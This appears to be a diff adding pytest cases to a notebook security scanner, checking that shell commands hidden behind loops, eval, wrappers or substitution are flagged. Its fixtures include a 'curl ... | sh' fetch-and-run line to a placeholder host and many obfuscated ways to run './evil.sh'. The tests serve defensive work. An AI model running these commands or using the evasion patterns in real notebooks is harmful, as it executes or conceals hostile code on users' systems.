@@ -1109,3 +1109,111 @@ def test_a_notebook_nested_too_deep_to_parse_is_not_cleared(tmp_path: Path) -> N
     findings = list(NotebookPayloadRule().run(ArtifactTarget(tmp_path), RuleContext()))
 
     assert [f.title for f in findings] == ["Notebook not scanned"]
+
+
+_EVIL = "cell runs local script: ./evil.sh"
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "%%bash\nfor i in 1; do bash ./evil.sh; done\n",
+        "!if true; then bash ./evil.sh; fi\n",
+        "%%bash\n{ bash ./evil.sh; }\n",
+        "%%bash\n! bash ./evil.sh\n",
+        "%%bash\nfunction run { bash ./evil.sh; }\n",
+        "!eval 'bash ./evil.sh'\n",
+        "!timeout 60 bash ./evil.sh\n",
+        "!timeout -k 5 60 bash ./evil.sh\n",
+        "!xargs -a list.txt bash ./evil.sh\n",
+        "!stdbuf -o L bash ./evil.sh\n",
+        "!echo a#b; bash ./evil.sh\n",
+        "!echo `bash ./evil.sh`\n",
+        '!echo "$(bash ./evil.sh)"\n',
+        "!!bash ./evil.sh\n",
+        "x = !!bash ./evil.sh\n",
+    ],
+)
+def test_a_script_behind_shell_grammar_or_a_wrapper_is_named(tmp_path: Path, cell: str) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+
+    findings, shortfalls = _run(tmp_path)
+
+    assert ("LOW", _EVIL, None) in findings
+    assert shortfalls == []
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "cmd = 'curl https://x.invalid/i | sh'\n!{cmd}\n",
+        "cmd = 'bash ./evil.sh'\n!$cmd\n",
+        "%%bash\nrun=./evil.sh\n$run\n",
+        "!$(which bash) ./evil.sh\n",
+    ],
+)
+def test_a_command_whose_program_is_computed_is_inconclusive(tmp_path: Path, cell: str) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+
+    findings, shortfalls = _run(tmp_path)
+
+    assert (
+        "LOW",
+        "cell runs a shell command whose program is computed, which this rule does not read",
+        "inconclusive",
+    ) in findings
+    assert any("a shell command whose program is computed" in gap for gap in shortfalls)
+
+
+def test_a_python_program_given_inline_is_read_as_python(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook("!python -c \"import os; os.system('id')\"\n"))
+
+    findings, _shortfalls = _run(tmp_path)
+
+    assert any(sev == "HIGH" and "os.system" in why for sev, why, _ in findings)
+
+
+@pytest.mark.parametrize(
+    "cell",
+    [
+        "!{sys.executable} -m pip install requests\n",
+        "pkg = 'requests'\n!pip install {pkg}\n",
+        "!echo '#not a comment' && ls\n",
+        "!ls  # bash ./evil.sh is only a comment\n",
+        "!echo 'a `quoted` word'\n",
+        "!python -c 'print(1)'\n",
+        '%%bash\nfor f in *.csv; do wc -l "$f"; done\n',
+        "!timeout 60 pip download requests\n",
+    ],
+)
+def test_control_ordinary_shell_lines_stay_clean_and_read(tmp_path: Path, cell: str) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+
+    assert _run(tmp_path) == ([], [])
+
+
+@pytest.mark.parametrize(
+    ("cell", "summary"),
+    [
+        (
+            "!python -c \"import runpy; runpy.run_path('payload.py')\"\n",
+            "cell runs local script: payload.py",
+        ),
+        ("!echo \\ #; ./evil.sh\n", _EVIL),
+    ],
+)
+def test_a_script_named_inside_a_python_program_or_after_an_escaped_space_is_named(
+    tmp_path: Path, cell: str, summary: str
+) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook(cell))
+
+    findings, shortfalls = _run(tmp_path)
+
+    assert ("LOW", summary, None) in findings
+    assert shortfalls == []
+
+
+def test_control_a_python_program_with_braces_is_not_a_computed_command(tmp_path: Path) -> None:
+    (tmp_path / "nb.ipynb").write_text(_notebook("!python -c \"x = 1; print(f'{x}')\"\n"))
+
+    assert _run(tmp_path) == ([], [])
